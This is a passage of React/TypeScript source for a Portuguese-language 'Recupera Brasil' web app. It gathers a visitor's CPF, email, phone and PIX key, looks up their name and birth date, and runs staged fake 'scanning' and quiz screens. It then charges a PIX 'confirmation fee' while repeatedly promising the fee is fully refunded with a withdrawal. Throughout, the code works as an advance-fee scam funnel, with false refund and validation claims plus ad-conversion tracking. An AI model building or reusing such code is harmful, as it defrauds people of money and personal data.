            <div className="field-group"><label htmlFor="checkoutPhone">Telefone com DDD</label><input id="checkoutPhone" className="plain-input" type="tel" inputMode="tel" placeholder="(00) 00000-0000" value={checkoutPhone} onChange={(event) => setCheckoutPhone(event.target.value)} data-testid="input-checkout-phone" /></div>
            <div className="protected-list"><strong><LockKeyhole size={16} /> Ambiente de dados protegido</strong><span><Check size={15} /> Confirmação imediata do pagamento</span><span><Check size={15} /> Dados criptografados durante o processo</span><span><Check size={15} /> Os {fee} são 100% devolvidos com o saque</span></div>
            <button type="button" className="primary-button" onClick={goToPayment} disabled={!checkoutName.trim() || !validEmail(checkoutEmail) || checkoutCpf.replace(/\D/g, '').length !== 11 || checkoutPhone.replace(/\D/g, '').length < 10} data-testid="button-go-to-payment"><span>Ir para pagamento</span><ArrowRight size={18} /></button>
          </section>
        )}
        {step === 2 && (
          <section className="checkout-box" data-testid="checkout-step-payment">
            <div className="checkout-box-heading"><span>02</span><div><p className="eyebrow">FORMA DE PAGAMENTO</p><h2>Confirmação via PIX</h2></div></div>
            <div className="checkout-refund-notice">
              <CheckCircle2 size={20} />
              <p><strong>Este valor não é perdido.</strong> Os {fee} pagos na confirmação serão devolvidos integralmente junto com o saque.</p>
            </div>
            <div className="pix-choice"><div className="pix-logo"><img src="/legacy/logopix/logopix.png" alt="PIX" /></div><div><strong>PIX</strong><span>Pagamento instantâneo e seguro</span></div><b className="pix-discount-badge">{discountPercent}% OFF</b><CheckCircle2 size={20} /></div>
            <div className="checkout-summary">
              <div><span>Valor original</span><strong className="checkout-original-value">{originalFee}</strong></div>
              <div><span>Desconto de {discountPercent}% no PIX</span><strong className="checkout-discount-value">− {pixDiscount}</strong></div>
              <div><span>Total a pagar no PIX</span><strong>{fee}</strong></div>
              <div><span>Reembolso da taxa</span><strong className="checkout-refund-value">100% · {fee}</strong></div>
              <div><span>Chave que receberá o total</span><strong>{pixKey}</strong></div>
              <div className="checkout-summary-total"><span>Total a receber após validação</span><strong>{total}</strong></div>
            </div>
            <p className="checkout-refund-equation">{AMOUNT} do saque + {fee} devolvidos = <strong>{total} na sua conta PIX</strong></p>
            <button type="button" className={`primary-button ${generating ? 'is-loading' : ''}`} onClick={generatePayment} disabled={generating} data-testid="button-generate-pix">
              {generating ? <><RefreshCw size={17} className="spin" /><span>Gerando PIX, aguarde...</span></> : <><span>Gerar pagamento</span><ArrowRight size={18} /></>}
            </button>
            {generating && <p className="checkout-generation-note" role="status">A geração pode levar até 1 minuto. Não feche esta página nem toque novamente no botão.</p>}
            {paymentError && <p className="checkout-error" role="alert">{paymentError}</p>}
            <button type="button" className="text-button" onClick={() => setStep(1)} data-testid="button-back-payment"><ArrowLeft size={15} /> Revisar meus dados</button>
          </section>
        )}
        {step === 3 && (
          <section className="checkout-box checkout-box--qr" data-testid="checkout-step-qr">
            <div className="checkout-box-heading checkout-box-heading--center"><span className="success-number"><Check size={15} /></span><div><p className="eyebrow">PAGAMENTO PIX</p><h2>Escaneie para confirmar</h2></div></div>
            <div className="checkout-refund-notice checkout-refund-notice--compact">
              <CheckCircle2 size={19} />
              <p><strong>Reembolso de 100%:</strong> após a confirmação, os {fee} retornam junto com o saque, totalizando {total}.</p>
            </div>
            <div className="copy-pix-group">
              <label htmlFor="pixCode">{copied ? 'Código PIX copiado' : `Copie o PIX de ${fee} para pagar`}</label>
              <input
                id="pixCode"
                ref={pixCodeInputRef}
                className="plain-input"
                value={pixCode}
                readOnly
                onFocus={(event) => event.currentTarget.select()}
                data-testid="input-pix-copy-code"
              />
              <button type="button" className={`copy-pix-button ${copied ? 'is-copied' : ''}`} onClick={copyPix} data-testid="button-copy-pix">
                {copied ? <><Check size={21} /> Código PIX copiado!</> : <><Copy size={21} /> Copiar código PIX agora</>}
              </button>
              {copyFailed && (
                <p className="checkout-error" role="alert" data-testid="text-copy-pix-error">
                  Não foi possível copiar automaticamente. O código já está selecionado no campo acima — pressione Ctrl+C (ou Cmd+C no iPhone/Mac) para copiar.
                </p>
              )}
              <p className="copy-pix-helper">{copied ? 'Agora abra o aplicativo do seu banco e cole o código.' : 'Toque no botão acima para copiar automaticamente.'}</p>
            </div>
            <div className="pix-tip"><Smartphone size={17} /><span>No app do seu banco, escolha <strong>PIX copia e cola</strong> e cole o código copiado.</span></div>
            <div className="timer-badge"><span className="timer-dot" /> Código válido por <strong>{minutes}:{remainingSeconds}</strong></div>
            <p className="qr-alternative-label">Ou escaneie o QR Code em outro aparelho</p>
            <GatewayQrCode value={pixCode} />
            <button type="button" className="primary-button" onClick={checkPayment} disabled={checkingPayment} data-testid="button-confirm-payment">
              {checkingPayment ? <><RefreshCw size={17} className="spin" /><span>Verificando pagamento...</span></> : <><span>Já realizei o pagamento</span><CheckCircle2 size={18} /></>}
            </button>
            {paymentError && <p className="checkout-error" role="alert">{paymentError}</p>}
            <p className="checkout-footnote">A confirmação pode levar alguns instantes. O valor pago será devolvido integralmente junto com o saque.</p>
          </section>
        )}
      </main>
      {step === 3 && !copied && (
        <div className="mobile-copy-bar">
          <button type="button" onClick={copyPix} data-testid="button-copy-pix-sticky">
            <Copy size={20} />
            <span>Copiar PIX — {fee}</span>
          </button>
        </div>
      )}
    </div>
  );
}

function SuccessStage({ name, onRestart }: { name: string; onRestart: () => void }) {
  const { total } = useOfferConfig();
  return (
    <section className="success-stage" data-testid="status-payment-success">
      <div className="success-icon"><CheckCircle2 size={38} /></div>
      <p className="eyebrow">SOLICITAÇÃO CONFIRMADA</p>
      <h1>Pagamento recebido, {name.split(' ')[0]}.</h1>
      <p className="success-lead">Sua identidade e titularidade foram validadas com sucesso.</p>
      <div className="success-details"><div><span>Status do saque</span><strong>Em processamento prioritário</strong></div><div><span>Valor total liberado</span><strong>{total}</strong></div><div><span>Prazo de depósito PIX</span><strong>Até 15 minutos</strong></div></div>
      <div className="success-mail"><Mail size={18} /><span>O comprovante e a autorização de transferência serão enviados para o e-mail informado.</span></div>
      <button type="button" className="secondary-button" onClick={onRestart} data-testid="button-new-consultation"><Clipboard size={16} /> Iniciar nova consulta</button>
    </section>
  );
}

function Home() {
  const preview = import.meta.env.DEV ? new URLSearchParams(window.location.search).get('preview') : null;
  const checkoutPreview = preview === 'checkout';
  const resultPreview = preview === 'result';
  const [stage, setStage] = useState<Stage>(checkoutPreview ? 'checkout' : resultPreview ? 'result' : 'landing');
  const [cpf, setCpf] = useState(() => localStorage.getItem('recupera_cpf_formatted') || (checkoutPreview ? '529.982.247-25' : ''));
  const [email, setEmail] = useState(checkoutPreview ? 'cliente@exemplo.com' : '');
  const [name, setName] = useState(() => localStorage.getItem('recupera_nome') || (checkoutPreview || resultPreview ? 'Cliente Exemplo' : defaultName));
  const [birthDate, setBirthDate] = useState(() => localStorage.getItem('recupera_data_nascimento') || (resultPreview ? '10/05/1988' : ''));
  const [pixKey, setPixKey] = useState(() => localStorage.getItem('recupera_chave_pix') || (checkoutPreview ? '52998224725' : ''));
  const [pixModalOpen, setPixModalOpen] = useState(false);
  const [consultationFailed, setConsultationFailed] = useState(false);
  const cpfParams = { cpf: cpf.replace(/\D/g, '') };
  const cpfQuery = useConsultCpf(
    cpfParams,
    { query: { enabled: false, queryKey: getConsultCpfQueryKey(cpfParams) } },
  );

  useEffect(() => {
    void loadTrackingPixels();
  }, []);

  useEffect(() => {
    const funnelStage = stage === 'landing'
      ? 'landing'
      : stage === 'intro'
        ? 'intro'
        : stage === 'scanning'
          ? 'scanning'
          : stage === 'quiz'
            ? 'quiz'
            : stage === 'analyzing'
              ? 'analyzing'
              : stage === 'result'
                ? 'result'
                : stage === 'verification'
                  ? 'verification'
                  : stage === 'checkout'
                    ? 'checkout'
                    : 'success';
    trackEvent('funnel_stage_viewed', { stage: funnelStage });
  }, [stage]);

  useEffect(() => {
    const timer = window.setTimeout(() => {
      trackEvent('engaged_session', { after_seconds: 15 });
    }, 15000);
    return () => window.clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (stage === 'result') {
      trackTikTokEvent('ViewContent', {
        content_name: 'Resultado da consulta',
        content_type: 'product',
      });
    }
  }, [stage]);

  const submitConsultation = async () => {
    const rawCpf = cpf.replace(/\D/g, '');
    if (rawCpf.length !== 11 || !validEmail(email)) return;
    localStorage.setItem('recupera_cpf', rawCpf);
    localStorage.setItem('recupera_cpf_formatted', cpf);
    localStorage.setItem('recupera_email', email.trim());
    trackEvent('cpf_consultation_submitted', { has_email: true });
    setStage('scanning');
    trackTikTokEvent('SubmitForm', {
      content_name: 'Consulta de CPF',
      content_type: 'product',
    });
    const result = await cpfQuery.refetch();
    if (result.data?.nome) {
      setName(result.data.nome);
      localStorage.setItem('recupera_nome', result.data.nome);
      setConsultationFailed(false);
    } else {
      setConsultationFailed(true);
      trackEvent('cpf_consultation_failed', {});
    }
    if (result.data?.dataNascimento) {
      setBirthDate(result.data.dataNascimento);
      localStorage.setItem('recupera_data_nascimento', result.data.dataNascimento);
    } else {
      setBirthDate('');
      localStorage.removeItem('recupera_data_nascimento');
    }
  };
  const continueWithPix = (type: PixType, value: string) => {
    localStorage.setItem('recupera_chave_pix', value.trim());
    localStorage.setItem('recupera_tipo_chave_pix', type);
    setPixKey(value.trim());
    trackEvent('pix_key_submitted', { key_type: type });
    setPixModalOpen(false);
    setStage('verification');
  };
  const restart = () => {
    setStage('intro');
    setPixModalOpen(false);
  };
  const { feeValue } = useOfferConfig();
  const openCheckout = () => {
    trackEvent('internal_checkout_started', {
      checkout_type: 'pix_internal',
      amount_brl: feeValue,
    });
    trackTikTokEvent('InitiateCheckout', {
      content_name: 'Taxa de confirmação',
      content_type: 'product',
      value: feeValue,
      currency: 'BRL',
    });
    trackMetaEvent('InitiateCheckout', {
      value: feeValue,
      currency: 'BRL',
      content_name: 'Taxa de confirmação',
    });
    setStage('checkout');
  };
  return (
    <div className={`app-frame stage-${stage}`}>
      <div className="ambient ambient--left" aria-hidden="true" />
      <div className="ambient ambient--right" aria-hidden="true" />
      <div className="application-shell">
        {stage !== 'landing' && stage !== 'intro' && stage !== 'scanning' && stage !== 'analyzing' && <ProgressRail stage={stage} />}
        <main className="main-panel">
          {stage === 'landing' && <LandingStage onAccess={() => {
            trackEvent('landing_access_clicked');
            setStage('intro');
          }} />}
          {stage === 'intro' && <IntroStage cpf={cpf} email={email} setCpf={setCpf} setEmail={setEmail} onSubmit={submitConsultation} />}
          {stage === 'scanning' && <ScanningStage mode="consultation" onComplete={() => setStage('quiz')} />}
          {stage === 'quiz' && <EligibilityQuiz onComplete={() => setStage('analyzing')} />}
          {stage === 'analyzing' && <ScanningStage mode="quiz" onComplete={() => setStage('result')} />}
          {stage === 'result' && <ResultStage name={name} birthDate={birthDate} consultationFailed={consultationFailed} onContinue={() => setPixModalOpen(true)} onRetry={() => { setConsultationFailed(false); setStage('intro'); }} />}
          {stage === 'verification' && <VerificationStage name={name} cpf={cpf} pixKey={pixKey} onContinue={openCheckout} onBack={() => {
            trackEvent('flow_back_clicked', { from_stage: 'verification' });
            setStage('result');
          }} />}
          {stage === 'success' && <SuccessStage name={name} onRestart={restart} />}
        </main>
        {stage !== 'landing' && stage !== 'scanning' && stage !== 'analyzing' && stage !== 'success' && (
          <footer className="app-footer"><span><ShieldCheck size={14} /> Sistema de solicitações de saque</span><span>© 2026 Recupera Brasil</span></footer>
        )}
      </div>
      {stage === 'checkout' && (
        <CheckoutStage
          name={name}
          email={email}
          cpf={cpf}
          pixKey={pixKey}
          previewMode={checkoutPreview}
          onClose={() => {
            trackEvent('checkout_closed', { checkout_type: 'pix_internal' });
            setStage('verification');
          }}
          onSuccess={() => setStage('success')}
        />
      )}
      {pixModalOpen && <PixKeyModal name={name} cpf={cpf} onClose={() => setPixModalOpen(false)} onContinue={continueWithPix} />}
    </div>
  );
}

function Router() {
  const [location] = useLocation();
  return <RoutedErrorBoundary resetKey={location}>{location.startsWith('/admin') ? <AdminApp /> : <OfferConfigProvider><Home /></OfferConfigProvider>}</RoutedErrorBoundary>;
}

function RoutedErrorBoundary({ children, resetKey }: { children: ReactNode; resetKey: string }) {
  return <ErrorBoundary resetKey={resetKey}>{children}</ErrorBoundary>;
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <WouterRouter base={import.meta.env.BASE_URL.replace(/\/$/, '')}><Router /></WouterRouter>
        <Toaster />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
